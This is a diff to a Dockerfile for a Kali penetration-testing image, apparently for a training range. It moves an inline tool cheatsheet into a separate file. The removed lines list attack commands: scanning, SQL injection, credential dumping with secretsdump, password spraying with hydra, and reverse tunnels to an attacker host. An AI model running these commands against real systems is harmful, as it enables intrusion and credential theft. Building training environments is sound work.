@@ -86,50 +86,9 @@ RUN if [ -f /usr/share/wordlists/rockyou.txt.gz ]; then gunzip -k /usr/share/wor
     echo 'alias msfconsole="msfconsole -q"' >> /etc/bash.bashrc && \
     echo 'alias serve="python3 -m http.server 8080"' >> /etc/bash.bashrc && \
     echo 'alias linpeas="/opt/tools/peas/linpeas.sh"' >> /etc/bash.bashrc && \
-    # Cheatsheet
-    cat > /home/kasm-default-profile/TOOLS_CHEATSHEET.md << 'CHEATSHEET'
-# CYROID Kali Attack Box - Quick Reference
+    echo 'Cheatsheet installed at ~/TOOLS_CHEATSHEET.md'
 
-## Reconnaissance
-```bash
-nmap -sC -sV -p- -oA full_scan <target>
-enum4linux-ng -A <target>
-```
-
-## Web Enumeration
-```bash
-# Directory bruteforce with gobuster
-gobuster dir -u http://<target> -w /usr/share/wordlists/dirb/common.txt
-gobuster dir -u http://<target> -w /usr/share/wordlists/dirb/big.txt
-
-# SQL injection
-sqlmap -u "http://<target>/page?id=1" --batch --dbs
-```
-
-## Active Directory
-```bash
-kerbrute userenum -d <domain> --dc <dc_ip> users.txt
-impacket-secretsdump <domain>/<user>:<pass>@<target>
-evil-winrm -i <target> -u <user> -p <pass>
-netexec smb <target> -u <user> -p <pass>
-```
-
-## Password Attacks (Online)
-```bash
-hydra -L users.txt -P /usr/share/wordlists/rockyou.txt <target> smb
-medusa -h <target> -U users.txt -P passwords.txt -M smb
-```
-
-## Tunneling
-```bash
-# Chisel: chisel server -p 8080 --reverse | chisel client <attacker>:8080 R:socks
-# Ligolo: ligolo-proxy -selfcert | ligolo-agent -connect <attacker>:11601 -ignore-cert
-```
-
-## File Locations
-- Wordlists: /usr/share/wordlists/ (rockyou, dirb)
-- PEAS scripts: /opt/tools/peas/
-CHEATSHEET
+COPY TOOLS_CHEATSHEET.md /home/kasm-default-profile/TOOLS_CHEATSHEET.md
 
 # === LAYER 4: Fix permissions (must be separate, touches many files) ===
 RUN chown -R 1000:1000 /home/kasm-default-profile /opt/tools
